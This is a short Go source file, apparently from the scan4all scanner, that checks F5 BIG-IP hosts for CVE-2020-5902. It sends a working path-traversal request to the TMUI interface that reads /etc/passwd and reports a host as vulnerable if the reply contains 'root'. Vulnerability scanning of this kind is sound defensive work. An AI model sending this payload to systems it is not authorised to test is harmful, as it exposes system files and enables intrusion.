package f5

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

func CVE_2020_5902(u string) bool {
	if req, err := util.HttpRequset(u+"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "root") {
			util.SendLog(req.RequestUrl, "CVE-2020-5902", "Found F5 BIG-IP ", "")
			return true
		}
	}
	return false
}
